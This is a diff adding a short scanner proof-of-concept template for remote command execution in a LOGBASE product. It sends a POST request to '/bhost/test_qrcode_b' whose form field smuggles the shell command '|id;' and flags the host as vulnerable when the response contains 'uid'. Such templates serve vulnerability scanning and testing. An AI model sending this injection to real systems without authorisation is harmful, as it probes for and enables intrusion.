@@ -1,0 +1,10 @@
+name: poc-yaml-LOGBASE-rce
+rules:
+  - method: POST
+    path: "/bhost/test_qrcode_b"
+    body:
+      'z1=1&z2="|id;"&z3=bhost'
+    expression: |
+      response.status == 200 && response.body.bcontains(b'uid')
+detail:
+  author: 666
